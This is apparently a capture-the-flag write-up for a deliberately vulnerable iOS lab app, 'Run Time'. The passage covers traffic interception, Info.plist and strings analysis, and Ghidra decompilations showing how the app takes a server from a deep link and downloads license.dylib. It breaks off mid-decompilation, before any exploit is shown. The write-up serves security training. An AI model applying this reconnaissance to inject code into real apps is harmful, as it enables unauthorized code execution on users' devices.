**Description**: Welcome to the **iOS Application Security Lab: Dynamic Library Injection Challenge**. This challenge focuses on a fictitious app called Run Time , which tracks the steps while running. Your objective is to bypass the app's protections, deliver the exploit and gain code execution utilizing the dynamic library injection.

**Download**: https://lautarovculic.com/my_files/runtime.ipa
**Link:** https://www.mobilehackinglab.com/path-player?courseid=lab-runtime

![[runtime1.png]]

Install an **IPA** file can be difficult.
So, for make it more easy, I made a YouTube video with the process using **Sideloadly**.
**LINK**: https://www.youtube.com/watch?v=YPpo9owRKGE

**NOTE**: If you have problems with the keyboard and UI (buttons) when you need to hide it on a physical device, you can fix this problem by using the `KeyboardTools` by `@CrazyMind90` found in the Sileo app store.

First let's understand the app behavior.
I recommend make this flow intercepting **all request** in **burpsuite** for a better understanding.

Well, we don't have many functionalities.
I just can intercept *two request*:
```HTTP
GET /runtime/health HTTP/2
Host: mhl.pages.dev
User-Agent: Runtime/1 CFNetwork/1410.1 Darwin/22.6.0
Accept: */*
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Accept-Encoding: gzip, deflate, br
```

And
```HTTP
GET /runtime/payment?license_type=pro HTTP/2
Host: mhl.pages.dev
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Sec-Fetch-Site: none
Accept-Encoding: gzip, deflate, br
Upgrade-Insecure-Requests: 1
Sec-Fetch-Mode: navigate
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_7_10 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Sec-Fetch-Dest: document
```

With nothing useful information.
We just have functions like *Sync Data*, *See history*, *Start free trial* and *Suscribe now*.
Let's move to **Static analysis** *unzipping* the **`.ipa`** file.
Looking for **`Info.plist`** file, we can se some interesting data

The **URL scheme**
```XML
<key>CFBundleURLTypes</key>
<array>
    <dict>
        <key>CFBundleTypeRole</key>
        <string>Viewer</string>
        <key>CFBundleURLName</key>
        <string>com.mobilehackinglab.runtime</string>
        <key>CFBundleURLSchemes</key>
        <array>
            <string>runtime</string>
        </array>
    </dict>
</array>
```
Wich is **`runtime://`**

The **Bundle ID**: `com.mobilehackinglab.runtime` (may be for work with frida).
And the **SceneDelegate** (for *custom URL handling*).
```XML
<key>UIApplicationSceneManifest</key>
<dict>
    <key>UISceneConfigurations</key>
    <dict>
        <key>UIWindowSceneSessionRoleApplication</key>
        <array>
            <dict>
                <key>UISceneDelegateClassName</key>
                <string>Runtime.SceneDelegate</string>
            </dict>
        </array>
    </dict>
</dict>
```
This can be a little helpful for understanding some behavior of the app
```bash
strings "Runtime" | grep "openURLContexts"
```
And we can see `scene:openURLContexts:`
Now it's time for look some what see in ghidra with strings analysis.
```bash
strings "Runtime" | grep -iE "openURLContexts|suscribe|token|license|checkout|request|runtime://|key"
```
✨ Output ✨ (sparks because this output will save us a lot of time.)
```bash
runtime://buypro?server=mhl.pages.dev/runtime
runtime://starttrial?server=mhl.pages.dev/runtime&trialKey=1234-5678-ABCD
Invalid license format
/payment?license_type=pro
X-API-Key
Unable to store license file!
license.dylib
Failed to move or load the license file
Failed to load the license file
Cannot connect to host while getting license
token
Invalid token format
trialKey
setObject:forKey:
stringForKey:
dataTaskWithRequest:completionHandler:
application:didRegisterForRemoteNotificationsWithDeviceToken:
application:handleWatchKitExtensionRequest:reply:
applicationShouldRequestHealthAuthorization:
applicationShouldAutomaticallyLocalizeKeyCommands:
makeKeyAndVisible
scene:openURLContexts:
OpenExternalURLOptionsKey
NUIApplicationOpenExternalURLOptionsKey
LaunchOptionsKey
NUIApplicationLaunchOptionsKey
```
Useful information:
- **Library**: `license.dylib`
- Some **Keys** references like `stringForKey` and `trialKey`
- **URL**:
	- `runtime://buypro?server=mhl.pages.dev/runtime`
	- `runtime://starttrial?server=mhl.pages.dev/runtime&trialKey=1234-5678-ABCD`

Let's load the binary into **ghidra**.
We can see the **`getLicenseFile`** function, which is
```CPP
void __thiscall
Runtime::SubscribeController::getLicenseFile
          (SubscribeController *this,undefined8 param_1,undefined8 param_2,char *param_3,
          void *param_4)

{
  URLRequest *pUVar1;
  SubscribeController *pSVar2;
  
[...]
[...]
[...]

  local_108 = param_2;
  local_20 = this;
  local_190 = (undefined *)Foundation::URLRequest::typeMetadataAccessor();
  local_188 = *(int *)(local_190 + -8);
  local_180 = *(int *)(local_188 + 0x40) + 0xfU & 0xfffffffffffffff0;
  (*(code *)PTR____chkstk_darwin_100024208)();
  puVar6 = (undefined *)((int)&UStack_1f0 - local_180);
  local_170 = extraout_x8 + 0xfU & 0xfffffffffffffff0;
  local_178 = puVar6;
  (*(code *)PTR____chkstk_darwin_100024208)();
  pUVar1 = (URLRequest *)(puVar6 + -local_170);
  local_168 = pUVar1;
  local_28 = pUVar1;
  iVar3 = ___swift_instantiateConcreteTypeFromMangledName
                    ((int *)&$$demangling_cache_variable_for_type_metadata_for_Foundation.URL?);
  local_158 = *(int *)(*(int *)(iVar3 + -8) + 0x40) + 0xfU & 0xfffffffffffffff0;
  (*(code *)PTR____chkstk_darwin_100024208)(local_160);
  iVar3 = (int)pUVar1 - local_158;
  local_d0 = iVar3;
  local_c0 = (undefined *)Foundation::URL::typeMetadataAccessor();
  local_d8 = *(int *)(local_c0 + -8);
  local_140 = *(int *)(local_d8 + 0x40) + 0xfU & 0xfffffffffffffff0;
  uVar8 = local_110;
  uVar7 = local_108;
  pcVar9 = local_150;
  pvVar4 = local_148;
  (*(code *)PTR____chkstk_darwin_100024208)();
  puVar6 = (undefined *)(iVar3 - local_140);
  local_130 = extraout_x8_00 + 0xfU & 0xfffffffffffffff0;
  UVar5.unknown = puVar6;
  local_138.unknown = puVar6;
  (*(code *)PTR____chkstk_darwin_100024208)();
  local_128 = (int)puVar6 - local_130;
  local_58 = this;
  local_50 = pcVar9;
  local_48 = pvVar4;
  local_40 = uVar8;
  local_38 = uVar7;
  local_30 = local_128;
  _objc_retain(this);
  uVar8 = 1;
  local_60 = this;
  local_70 = (undefined *)Swift::DefaultStringInterpolation::init(local_120,1);
  local_f8 = &local_70;
  local_c4 = 1;
  DVar10.unknown = (undefined *)0x1;
  local_68 = uVar8;
  SVar12 = Swift::String::init("http://",7,1);
  local_118 = SVar12.bridgeObject;
  Swift::DefaultStringInterpolation::appendLiteral(SVar12,DVar10);
  _swift_bridgeObjectRelease(local_118);
  local_80 = local_110;
  local_78 = local_108;
  Swift::DefaultStringInterpolation::$appendInterpolation
            ((char)&stack0xfffffffffffffff0 + -0x70,
             (DefaultStringInterpolation)PTR_$$type_metadata_for_Swift.String_100024408);
  DVar10.unknown = (undefined *)(uint)(local_c4 & 1);
  SVar12 = Swift::String::init("/download",9,(__int8)(local_c4 & 1));
  local_100 = SVar12.bridgeObject;
  Swift::DefaultStringInterpolation::appendLiteral(SVar12,DVar10);
  _swift_bridgeObjectRelease(local_100);
  local_e8.unknown = local_70;
  local_f0 = local_68;
  _swift_bridgeObjectRetain();
  $$outlined_destroy_of_Swift.DefaultStringInterpolation((int)local_f8);
  SVar12 = Swift::String::init(local_e8);
  local_e0 = SVar12.bridgeObject;
  Foundation::URL::$init();
  _swift_bridgeObjectRelease(local_e0);
  iVar3 = local_d0;
  (**(code **)(local_d8 + 0x30))(local_d0,local_c4,local_c0);
  pUVar1 = local_168;
  if ((sdword)iVar3 == 1) {
    $$outlined_destroy_of_Foundation.URL?(local_d0);
    local_1e8 = Swift::String::init("Invalid URL",0xb,1);
    dVar11 = (double)$showToast();
    showToast(dVar11,local_1e8.str,(int)local_1e8.bridgeObject,local_198);
    _swift_bridgeObjectRelease(local_1e8.bridgeObject);
    _objc_release(local_198);
  }
  else {
    (**(code **)(local_d8 + 0x20))(local_128,local_d0,local_c0);
    (**(code **)(local_d8 + 0x10))(local_138.unknown,local_128,local_c0);
    local_1d8.unknown =
         (undefined *)
         $$default_argument_1_of_Foundation.URLRequest.init(url:_Foundation.URL,cachePolicy:___C.NSU RLRequestCachePolicy,timeoutInterval:_Swift.Double)_->_Foundation.URLRequest
                   ();
    dVar11 = (double)$$default_argument_2_of_Foundation.URLRequest.init(url:_Foundation.URL,cachePol icy:___C.NSURLRequestCachePolicy,timeoutInterval:_Swift.Double)_->_Foundation.URLRequest
                               ();
    Foundation::URLRequest::init(local_138,local_1d8,dVar11);
    local_1cc = 1;
    Swift::String::init("GET",3,1);
    Foundation::URLRequest::$set_httpMethod(pUVar1);
    forHTTPHeaderField = Swift::String::init("X-API-Key",9,(byte)local_1cc & 1);
    local_1c8 = forHTTPHeaderField.bridgeObject;
    SVar12.bridgeObject = local_148;
    SVar12.str = local_150;
    Foundation::URLRequest::addValue(SVar12,forHTTPHeaderField,UVar5);
    pSVar2 = local_198;
    pvVar4 = local_1c8;
    _swift_bridgeObjectRelease();
    (**(code **)((*(uint *)pSVar2 & *(uint *)PTR__swift_isaMask_100024630) + 0x58))();
    UVar5.unknown = local_178;
    local_1b0 = pvVar4;
    (**(code **)(local_188 + 0x10))(local_178,local_168,local_190);
    local_1b8 = Foundation::URLRequest::_bridgeToObjectiveC(UVar5);
    local_1a0 = *(code **)(local_188 + 8);
    (*local_1a0)(local_178,local_190);
    _objc_retain(local_198);
    puVar6 = &DAT_1000249e8;
    _swift_allocObject(&DAT_1000249e8,0x18,7);
    *(SubscribeController **)(puVar6 + 0x10) = local_198;
    local_90 = 
    $$partial_apply_forwarder_for_closure_#1_@Sendable_(Foundation.Data?,__C.NSURLResponse?,Swift.Er ror?)_->_()_in_Runtime.SubscribeController.getLicenseFile(server:_Swift.String,withToken:_Swift. String)_->_()
    ;
    local_b0 = PTR___NSConcreteStackBlock_100024248;
    local_a8 = 0x42000000;
    local_a4 = 0;
    local_a0 = 
    $$reabstraction_thunk_helper_from_@escaping_@callee_guaranteed_@Sendable_(@guaranteed_Foundation .Data?,@guaranteed___C.NSURLResponse?,@guaranteed_Swift.Error?)_->_()_to_@escaping_@callee_unown ed_@convention(block)_@Sendable_(@unowned___C.NSData?,@unowned___C.NSURLResponse?,@unowned___C.N SError?)_->_()
    ;
    local_98 = &_block_descriptor.12;
    local_88 = puVar6;
    local_1c0 = __Block_copy(&local_b0);
    _swift_release(local_88);
    pvVar4 = local_1b0;
    _objc_msgSend(local_1b0,"dataTaskWithRequest:completionHandler:",local_1b8,local_1c0);
    _objc_retainAutoreleasedReturnValue();
    local_1a8 = pvVar4;
    __Block_release(local_1c0);
    _objc_release(local_1b8);
    _objc_release(local_1b0);
    local_b8 = local_1a8;
    _objc_msgSend(local_1a8,"resume");
    _objc_release(local_1a8);
    (*local_1a0)(local_168,local_190);
    (**(code **)(local_d8 + 8))(local_128,local_c0);
    _objc_release(local_198);
  }
  return;
}
```
This code **build a request** where **param_1** is the server.
The **X-API-Key** is **param_3**, expecting a **key**.
This request is **`http://`**, we can found the line
`Swift::String::init("http://",7,1);`. And also, we have the *endpoint* `/download` in `Swift::String::init("/download",9,(__int8)(local_c4 & 1));`

The URL looks like: `http://<server_url>/download`

Also, we have the function **`suscribeNow`** that is this code:
```CPP
void __thiscall Runtime::SubscribeController::subscribeNow(SubscribeController *this)

{
  int iVar1;
  undefined *puVar2;
  URL UVar3;
  int extraout_x8;
  String SVar4;
  tuple2.conflict2 tVar5;
  undefined auVar6 [16];
  int local_f0;
  undefined8 local_e8;
  undefined8 local_e0;
  TargetProtocolConformanceDescriptor *local_d8;
  undefined *local_d0;
  NSDictionary *local_c8;
  NSURL *local_c0;
  undefined *local_b8;
  code *local_b0;
  code *local_a8;
  NSURL *local_a0;
  undefined *local_98;
  dword local_8c;
  undefined *local_88;
  uint local_80;
  uint local_78;
  undefined *local_70;
  uint local_68;
  int local_60;
  void *local_58;
  int local_50;
  int local_48;
  undefined4 local_3c;
  undefined *local_38;
  SubscribeController *local_30;
  int local_28;
  SubscribeController *local_20;
  
  local_88 = PTR_$$type_metadata_for_Any_1000246f8 + 8;
  local_28 = 0;
  local_30 = (SubscribeController *)0x0;
  local_20 = this;
  iVar1 = ___swift_instantiateConcreteTypeFromMangledName
                    ((int *)&$$demangling_cache_variable_for_type_metadata_for_Foundation.URL?);
  local_80 = *(int *)(*(int *)(iVar1 + -8) + 0x40) + 0xfU & 0xfffffffffffffff0;
  (*(code *)PTR____chkstk_darwin_100024208)();
  iVar1 = (int)&local_f0 - local_80;
  local_48 = iVar1;
  local_38 = (undefined *)Foundation::URL::typeMetadataAccessor();
  local_50 = *(int *)(local_38 + -8);
  local_78 = *(int *)(local_50 + 0x40) + 0xfU & 0xfffffffffffffff0;
  (*(code *)PTR____chkstk_darwin_100024208)();
  puVar2 = (undefined *)(iVar1 - local_78);
  local_68 = extraout_x8 + 0xfU & 0xfffffffffffffff0;
  local_70 = puVar2;
  (*(code *)PTR____chkstk_darwin_100024208)();
  local_60 = (int)puVar2 - local_68;
  local_3c = 1;
  local_30 = this;
  local_28 = local_60;
  SVar4 = Swift::String::init("runtime://buypro?server=mhl.pages.dev/runtime",0x2d,1);
  local_58 = SVar4.bridgeObject;
  Foundation::URL::$init();
  _swift_bridgeObjectRelease(local_58);
  iVar1 = local_48;
  (**(code **)(local_50 + 0x30))(local_48,local_3c,local_38);
  UVar3.unknown = local_70;
  if ((sdword)iVar1 == 1) {
    $$outlined_destroy_of_Foundation.URL?(local_48);
  }
  else {
    (**(code **)(local_50 + 0x20))(local_60,local_48,local_38);
    puVar2 = &_OBJC_CLASS_$_UIApplication;
    _objc_opt_self();
    _objc_msgSend();
    _objc_retainAutoreleasedReturnValue();
    local_b0 = *(code **)(local_50 + 0x10);
    local_98 = puVar2;
    (*local_b0)(UVar3.unknown,local_60,local_38);
    local_a0 = Foundation::URL::_bridgeToObjectiveC(UVar3);
    local_a8 = *(code **)(local_50 + 8);
    (*local_a8)(local_70,local_38);
    puVar2 = local_98;
    _objc_msgSend(local_98,"canOpenURL:",local_a0);
    local_8c = (dword)puVar2;
    _objc_release(local_a0);
    _objc_release(local_98);
    UVar3.unknown = local_70;
    if ((local_8c & 1) == 0) {
      (*local_a8)(local_60,local_38);
    }
    else {
      puVar2 = &_OBJC_CLASS_$_UIApplication;
      _objc_opt_self();
      _objc_msgSend();
      _objc_retainAutoreleasedReturnValue();
      local_b8 = puVar2;
      (*local_b0)(UVar3.unknown,local_60,local_38);
      local_c0 = Foundation::URL::_bridgeToObjectiveC(UVar3);
      (*local_a8)(local_70,local_38);
      ___swift_instantiateConcreteTypeFromMangledName
                ((int *)&
                        $$demangling_cache_variable_for_type_metadata_for_(__C.UIApplicationOpenExte rnalURLOptionsKey,Any)
                );
      local_f0 = 0;
      tVar5 = Swift::$_allocateUninitializedArray(0);
      local_e8 = tVar5._0_8_;
      auVar6 = __C::UIApplicationOpenExternalURLOptionsKey::typeMetadataAccessor(local_f0);
      local_e0 = auVar6._0_8_;
      local_d8 = __C::UIApplicationOpenExternalURLOptionsKey::$lazy_protocol_witness_table_accessor
                           ();
      local_d0 = (undefined *)Swift::Dictionary::$init();
      local_c8 = (extension_Foundation)::Swift::Dictionary::_bridgeToObjectiveC();
      _swift_bridgeObjectRelease(local_d0);
      _objc_msgSend(local_b8,"openURL:options:completionHandler:",local_c0,local_c8,0);
      _objc_release(local_c8);
      _objc_release(local_c0);
      _objc_release(local_b8);
      (*local_a8)(local_60,local_38);
    }
  }
  return;
}
```

We can see that try open an URL
`SVar4 = Swift::String::init("runtime://buypro?server=mhl.pages.dev/runtime",0x2d,1);`
Also, check if there exist an app that can *handle the URL*.

But I don't see nothing useful for us.
There are also another function, **`trialSubscription`**
```CPP
void __thiscall Runtime::SubscribeController::trialSubscription(SubscribeController *this)

{
  int iVar1;
  undefined *puVar2;
  URL UVar3;
  int extraout_x8;
  String SVar4;
  tuple2.conflict2 tVar5;
  undefined auVar6 [16];
  int local_f0;
  undefined8 local_e8;
  undefined8 local_e0;
  TargetProtocolConformanceDescriptor *local_d8;
  undefined *local_d0;
  NSDictionary *local_c8;
  NSURL *local_c0;
  undefined *local_b8;
  code *local_b0;
  code *local_a8;
  NSURL *local_a0;
  undefined *local_98;
  dword local_8c;
  undefined *local_88;
  uint local_80;
  uint local_78;
  undefined *local_70;
  uint local_68;
  int local_60;
  void *local_58;
  int local_50;
  int local_48;
  undefined4 local_3c;
  undefined *local_38;
  SubscribeController *local_30;
  int local_28;
  SubscribeController *local_20;
  
  local_88 = PTR_$$type_metadata_for_Any_1000246f8 + 8;
  local_28 = 0;
  local_30 = (SubscribeController *)0x0;
  local_20 = this;
  iVar1 = ___swift_instantiateConcreteTypeFromMangledName
                    ((int *)&$$demangling_cache_variable_for_type_metadata_for_Foundation.URL?);
  local_80 = *(int *)(*(int *)(iVar1 + -8) + 0x40) + 0xfU & 0xfffffffffffffff0;
  (*(code *)PTR____chkstk_darwin_100024208)();
  iVar1 = (int)&local_f0 - local_80;
  local_48 = iVar1;
  local_38 = (undefined *)Foundation::URL::typeMetadataAccessor();
  local_50 = *(int *)(local_38 + -8);
  local_78 = *(int *)(local_50 + 0x40) + 0xfU & 0xfffffffffffffff0;
  (*(code *)PTR____chkstk_darwin_100024208)();
  puVar2 = (undefined *)(iVar1 - local_78);
  local_68 = extraout_x8 + 0xfU & 0xfffffffffffffff0;
  local_70 = puVar2;
  (*(code *)PTR____chkstk_darwin_100024208)();
  local_60 = (int)puVar2 - local_68;
  local_3c = 1;
  local_30 = this;
  local_28 = local_60;
  SVar4 = Swift::String::init("runtime://starttrial?server=mhl.pages.dev/runtime&trialKey=1234-5678- ABCD"
                              ,0x49,1);
  local_58 = SVar4.bridgeObject;
  Foundation::URL::$init();
  _swift_bridgeObjectRelease(local_58);
  iVar1 = local_48;
  (**(code **)(local_50 + 0x30))(local_48,local_3c,local_38);
  UVar3.unknown = local_70;
  if ((sdword)iVar1 == 1) {
    $$outlined_destroy_of_Foundation.URL?(local_48);
  }
  else {
    (**(code **)(local_50 + 0x20))(local_60,local_48,local_38);
    puVar2 = &_OBJC_CLASS_$_UIApplication;
    _objc_opt_self();
    _objc_msgSend();
    _objc_retainAutoreleasedReturnValue();
    local_b0 = *(code **)(local_50 + 0x10);
    local_98 = puVar2;
    (*local_b0)(UVar3.unknown,local_60,local_38);
    local_a0 = Foundation::URL::_bridgeToObjectiveC(UVar3);
    local_a8 = *(code **)(local_50 + 8);
    (*local_a8)(local_70,local_38);
    puVar2 = local_98;
    _objc_msgSend(local_98,"canOpenURL:",local_a0);
    local_8c = (dword)puVar2;
    _objc_release(local_a0);
    _objc_release(local_98);
    UVar3.unknown = local_70;
    if ((local_8c & 1) == 0) {
      (*local_a8)(local_60,local_38);
    }
    else {
      puVar2 = &_OBJC_CLASS_$_UIApplication;
      _objc_opt_self();
      _objc_msgSend();
      _objc_retainAutoreleasedReturnValue();
      local_b8 = puVar2;
      (*local_b0)(UVar3.unknown,local_60,local_38);
      local_c0 = Foundation::URL::_bridgeToObjectiveC(UVar3);
      (*local_a8)(local_70,local_38);
      ___swift_instantiateConcreteTypeFromMangledName
                ((int *)&
                        $$demangling_cache_variable_for_type_metadata_for_(__C.UIApplicationOpenExte rnalURLOptionsKey,Any)
                );
      local_f0 = 0;
      tVar5 = Swift::$_allocateUninitializedArray(0);
      local_e8 = tVar5._0_8_;
      auVar6 = __C::UIApplicationOpenExternalURLOptionsKey::typeMetadataAccessor(local_f0);
      local_e0 = auVar6._0_8_;
      local_d8 = __C::UIApplicationOpenExternalURLOptionsKey::$lazy_protocol_witness_table_accessor
                           ();
      local_d0 = (undefined *)Swift::Dictionary::$init();
      local_c8 = (extension_Foundation)::Swift::Dictionary::_bridgeToObjectiveC();
      _swift_bridgeObjectRelease(local_d0);
      _objc_msgSend(local_b8,"openURL:options:completionHandler:",local_c0,local_c8,0);
      _objc_release(local_c8);
      _objc_release(local_c0);
      _objc_release(local_b8);
      (*local_a8)(local_60,local_38);
    }
  }
  return;
}
```
Which also is from **SubscribeController** class.
Several local variables are defined, including pointers and structures that are likely to be used to handle URLs, strings and other data.

A string representing a URL (“`runtime://starttrial?server=mhl.pages.dev/runtime&trialKey=1234-5678-ABCD`”) is created and a URL object  is initialized.
Also, checks like the previous function with `canOpenURL:`.

And the *'most important'* code that we need inspect is the **`verifyLicense`** function:
```CPP
void __thiscall
Runtime::SubscribeController::verifyLicense
          (SubscribeController *this,undefined8 param_1,undefined8 param_2,char *param_3,
          void *param_4,undefined8 param_5,void *param_6)

{
  SubscribeController *pSVar1;
  bool bVar2;
  int iVar3;
  int iVar4;
  char *pcVar5;
  
[...]
[...]
[...]

  void *local_58;
  undefined8 local_50;
  undefined8 local_48;
  int local_40;
  int local_38;
  
  local_160.unknown = PTR_$$type_metadata_for_Swift.String_100024408;
  local_1f8 = PTR_$$type_metadata_for_Any_1000246f8 + 8;
  local_38 = 0;
  local_40 = 0;
  local_50 = 0;
  local_48 = 0;
  local_60 = (char *)0x0;
  local_58 = (void *)0x0;
  local_68 = (SubscribeController *)0x0;
  local_70 = (SubscribeController *)0x0;
  local_120 = 0;
  local_200 = this;
  local_1c0 = param_3;
  local_1b8 = param_4;
  local_170 = param_2;
  local_168 = param_1;
  iVar3 = ___swift_instantiateConcreteTypeFromMangledName
                    ((int *)&$$demangling_cache_variable_for_type_metadata_for_Foundation.Locale?);
  local_1f0 = *(int *)(*(int *)(iVar3 + -8) + 0x40) + 0xfU & 0xfffffffffffffff0;
  (*(code *)PTR____chkstk_darwin_100024208)();
  iVar3 = (int)&local_380 - local_1f0;
  local_1e8 = iVar3;
  iVar4 = ___swift_instantiateConcreteTypeFromMangledName
                    ((int *)&$$demangling_cache_variable_for_type_metadata_for_Foundation.URL?);
  local_1e0 = *(int *)(*(int *)(iVar4 + -8) + 0x40) + 0xfU & 0xfffffffffffffff0;
  (*(code *)PTR____chkstk_darwin_100024208)();
  iVar3 = iVar3 - local_1e0;
  local_1d0 = extraout_x8 + 0xfU & 0xfffffffffffffff0;
  local_1d8 = iVar3;
  (*(code *)PTR____chkstk_darwin_100024208)();
  iVar3 = iVar3 - local_1d0;
  local_1c8 = iVar3;
  local_1b0 = (undefined *)Foundation::URL::typeMetadataAccessor();
  local_1a8 = *(int *)(local_1b0 + -8);
  local_1a0 = *(int *)(local_1a8 + 0x40) + 0xfU & 0xfffffffffffffff0;
  uVar11 = local_168;
  uVar10 = local_170;
  pcVar5 = local_1c0;
  pvVar14 = local_1b8;
  (*(code *)PTR____chkstk_darwin_100024208)();
  iVar3 = iVar3 - local_1a0;
  local_190 = extraout_x8_00 + 0xfU & 0xfffffffffffffff0;
  local_198 = iVar3;
  local_38 = iVar3;
  (*(code *)PTR____chkstk_darwin_100024208)();
  puVar6 = (undefined *)(iVar3 - local_190);
  local_180 = extraout_x8_01 + 0xfU & 0xfffffffffffffff0;
  local_188 = puVar6;
  (*(code *)PTR____chkstk_darwin_100024208)();
  iVar3 = (int)puVar6 - local_180;
  local_178 = iVar3;
  local_68 = this;
  local_60 = pcVar5;
  local_58 = pvVar14;
  local_50 = uVar11;
  local_48 = uVar10;
  local_40 = iVar3;
  _objc_retain(this);
  local_80 = local_168;
  local_78 = local_170;
  local_70 = this;
  local_90 = Swift::String::init("mhl.pages.dev",0xd,1);
  local_150 = &local_90;
  pcVar5 = Swift::String::$lazy_protocol_witness_table_accessor();
  local_158 = pcVar5;
  bVar2 = (extension_Foundation)::Swift::StringProtocol::$contains((char)local_150);
  local_144 = (dword)CONCAT71(extraout_var,bVar2);
  $$outlined_destroy_of_Swift.String((int)local_150);
  if ((local_144 & 1) == 0) {
    local_380 = Swift::String::init("Invalid Server",0xe,1);
    dVar15 = (double)$showToast();
    showToast(dVar15,local_380.str,(int)local_380.bridgeObject,local_200);
    _swift_bridgeObjectRelease(local_380.bridgeObject);
  }
  else {
    SVar16 = Swift::String::init("buypro",6,1);
    local_210 = SVar16.bridgeObject;
    SVar17.bridgeObject = local_1b8;
    SVar17.str = local_1c0;
    SVar20.bridgeObject = param_6;
    SVar20.str = pcVar5;
    bVar2 = Swift::String::==_infix(SVar17,SVar16,SVar20);
    local_204 = (dword)CONCAT71(extraout_var_00,bVar2);
    _swift_bridgeObjectRelease(local_210);
    if ((local_204 & 1) != 0) {
      uVar11 = 1;
      local_130 = (undefined *)Swift::DefaultStringInterpolation::init(0x20,1);
      local_230 = &local_130;
      local_23c = 1;
      DVar12.unknown = (undefined *)0x1;
      local_128 = uVar11;
      SVar17 = Swift::String::init("http://",7,1);
      local_248 = SVar17.bridgeObject;
      Swift::DefaultStringInterpolation::appendLiteral(SVar17,DVar12);
      _swift_bridgeObjectRelease(local_248);
      local_140 = local_168;
      local_138 = local_170;
      Swift::DefaultStringInterpolation::$appendInterpolation((char)&local_140,local_160);
      DVar12.unknown = (undefined *)(uint)(local_23c & 1);
      SVar17 = Swift::String::init("/payment?license_type=pro",0x19,(__int8)(local_23c & 1));
      local_238 = SVar17.bridgeObject;
      Swift::DefaultStringInterpolation::appendLiteral(SVar17,DVar12);
      _swift_bridgeObjectRelease(local_238);
      local_220.unknown = local_130;
      local_228 = local_128;
      _swift_bridgeObjectRetain();
      $$outlined_destroy_of_Swift.DefaultStringInterpolation((int)local_230);
      SVar17 = Swift::String::init(local_220);
      local_218 = SVar17.bridgeObject;
      Foundation::URL::$init();
      _swift_bridgeObjectRelease(local_218);
      iVar3 = local_1c8;
      (**(code **)(local_1a8 + 0x30))(local_1c8,1,local_1b0);
      UVar9.unknown = local_188;
      if ((sdword)iVar3 == 1) {
        $$outlined_destroy_of_Foundation.URL?(local_1c8);
      }
      else {
        (**(code **)(local_1a8 + 0x20))(local_178,local_1c8,local_1b0);
        puVar6 = &_OBJC_CLASS_$_UIApplication;
        _objc_opt_self();
        _objc_msgSend();
        _objc_retainAutoreleasedReturnValue();
        local_270 = *(code **)(local_1a8 + 0x10);
        local_258 = puVar6;
        (*local_270)(UVar9.unknown,local_178,local_1b0);
        local_260 = Foundation::URL::_bridgeToObjectiveC(UVar9);
        local_268 = *(code **)(local_1a8 + 8);
        (*local_268)(local_188,local_1b0);
        puVar6 = local_258;
        _objc_msgSend(local_258,"canOpenURL:",local_260);
        local_24c = (dword)puVar6;
        _objc_release(local_260);
        _objc_release(local_258);
        UVar9.unknown = local_188;
        if ((local_24c & 1) == 0) {
          (*local_268)(local_178,local_1b0);
        }
        else {
          puVar6 = &_OBJC_CLASS_$_UIApplication;
          _objc_opt_self();
          _objc_msgSend();
          _objc_retainAutoreleasedReturnValue();
          local_278 = puVar6;
          (*local_270)(UVar9.unknown,local_178,local_1b0);
          local_280 = Foundation::URL::_bridgeToObjectiveC(UVar9);
          (*local_268)(local_188,local_1b0);
          ___swift_instantiateConcreteTypeFromMangledName
                    ((int *)&
                            $$demangling_cache_variable_for_type_metadata_for_(__C.UIApplicationOpen ExternalURLOptionsKey,Any)
                    );
          local_2b0 = 0;
          tVar18 = Swift::$_allocateUninitializedArray(0);
          local_2a8 = tVar18._0_8_;
          auVar19 = __C::UIApplicationOpenExternalURLOptionsKey::typeMetadataAccessor(local_2b0);
          local_2a0 = auVar19._0_8_;
          local_298 = __C::UIApplicationOpenExternalURLOptionsKey::
                      $lazy_protocol_witness_table_accessor();
          local_290 = (undefined *)Swift::Dictionary::$init();
          local_288 = (extension_Foundation)::Swift::Dictionary::_bridgeToObjectiveC();
          _swift_bridgeObjectRelease(local_290);
          _objc_msgSend(local_278,"openURL:options:completionHandler:",local_280,local_288,0);
          _objc_release(local_288);
          _objc_release(local_280);
          _objc_release(local_278);
          (*local_268)(local_178,local_1b0);
        }
      }
      _objc_release(local_200);
      return;
    }
    local_a0 = local_1c0;
    local_98 = local_1b8;
    local_2d4 = 1;
    local_b0 = Swift::String::init("^[0-9]{4}-[0-9]{4}-[A-Z]{4}$",0x1c,1);
    local_2d0 = &local_b0;
    local_2e0 = 0;
    LVar7 = Foundation::Locale::typeMetadataAccessor();
    (**(code **)(*(int *)(LVar7.unknown + -8) + 0x38))(local_1e8,1);
    pcVar5 = local_158;
    pSVar8 = local_2d0;
    dVar13 = (dword)local_2e0;
    *(char **)(iVar3 + -0x10) = local_158;
    *(char **)(iVar3 + -8) = pcVar5;
    uVar11 = 0x400;
    (extension_Foundation)::Swift::StringProtocol::$range
              ((char)pSVar8,(NSStringCompareOptions)0x400);
    local_2c8 = uVar11;
    local_2bc = dVar13;
    local_2b8 = pSVar8;
    $$outlined_destroy_of_Foundation.Locale?(local_1e8);
    $$outlined_destroy_of_Swift.String((int)local_2d0);
    local_c8 = local_2b8;
    local_c0 = local_2c8;
    local_b8 = (byte)local_2bc & 1;
    local_2e4 = (dword)((local_2bc & 1) != 0);
    if (local_2e4 != 0) {
      local_2f8 = Swift::String::init("Invalid license format",0x16,1);
      dVar15 = (double)$showToast();
      showToast(dVar15,local_2f8.str,(int)local_2f8.bridgeObject,local_200);
      _swift_bridgeObjectRelease(local_2f8.bridgeObject);
      _objc_release(local_200);
      return;
    }
    uVar11 = 1;
    local_d8 = (undefined *)Swift::DefaultStringInterpolation::init(0xe,1);
    local_318 = &local_d8;
    local_330 = 7;
    local_324 = 1;
    DVar12.unknown = (undefined *)0x1;
    local_d0 = uVar11;
    SVar17 = Swift::String::init("http://",7,1);
    local_338 = SVar17.bridgeObject;
    Swift::DefaultStringInterpolation::appendLiteral(SVar17,DVar12);
    _swift_bridgeObjectRelease(local_338);
    local_e8 = local_168;
    local_e0 = local_170;
    Swift::DefaultStringInterpolation::$appendInterpolation
              ((char)&stack0xfffffffffffffff0 + '(',local_160);
    DVar12.unknown = (undefined *)(uint)(local_324 & 1);
    SVar17 = Swift::String::init("/health",(__int16)local_330,(__int8)(local_324 & 1));
    local_320 = SVar17.bridgeObject;
    Swift::DefaultStringInterpolation::appendLiteral(SVar17,DVar12);
